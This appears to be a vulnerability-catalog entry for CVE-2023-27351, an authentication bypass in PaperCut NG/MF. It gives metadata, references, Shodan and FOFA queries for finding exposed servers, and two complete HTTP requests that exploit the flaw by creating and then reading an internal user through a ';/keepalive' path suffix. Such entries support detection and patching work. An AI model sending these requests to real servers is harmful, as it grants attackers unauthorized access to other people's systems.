---
layout: post
cve_id: CVE-2023-27351
title: PaperCut NG - Authentication Bypass
pcap: true
pcap_path: /pcaps/2023/CVE-2023-27351.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-27351.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo,jjcho
severity: high
impact: 'Attackers can bypass authentication, gaining unauthorized access to the system
  and potentially executing malicious actions.

  '
remediation: 'Update to the latest version of PaperCut NG that addresses this issue
  or apply the security patch provided by the vendor.

  '
reference:
- https://www.papercut.com/kb/Main/PO-1216-and-PO-1219
- https://www.zerodayinitiative.com/advisories/ZDI-23-232/
- https://nvd.nist.gov/vuln/detail/CVE-2023-27351
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
  cvss-score: 8.2
  cve-id: CVE-2023-27351
  epss-score: 0.47366
  epss-percentile: 0.97589
  cwe-id: CWE-287
  cpe: cpe:2.3:a:papercut:papercut_mf:*:*:*:*:*:*:*:*,cpe:2.3:a:papercut:papercut_ng:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: papercut
  product: papercut_mf,papercut_ng
  shodan-query:
  - http.html:"PaperCut"
  - http.html:"papercut"
  - http.html:"content=\"papercut\""
  - cpe:"cpe:2.3:a:papercut:papercut_mf"
  fofa-query:
  - body="papercut"
  - body="content=\"papercut\""
tags:
- cve2023
- cve
- papercut
- auth-bypass
- vkev
---

## üîç Vulnerability Description
This vulnerability allows remote attackers to bypass authentication on affected installations of PaperCut NG 22.0.5 (Build 63914). Authentication is not required to exploit this vulnerability. The specific flaw exists within the SecurityRequestFilter class. The issue results from improper implementation of the authentication algorithm. An attacker can leverage this vulnerability to bypass authentication on the system. Was ZDI-CAN-19226.


## üåê HTTP Request
```nohighlight
POST /rpc/api/rest/master/user/createInternalUser;/keepalive HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15
Connection: close
Content-Length: 47
Content-Type: application/json
Accept-Encoding: gzip
{"username":["iDOJhM"],"password":["p7466egi"]}
```

```nohighlight
POST /rpc/api/rest/master/user/getExportedUser;/keepalive HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:105.0) Gecko/20100101 Firefox/105.0
Connection: close
Content-Length: 23
Content-Type: application/json
Accept-Encoding: gzip
{"username":["iDOJhM"]}
```

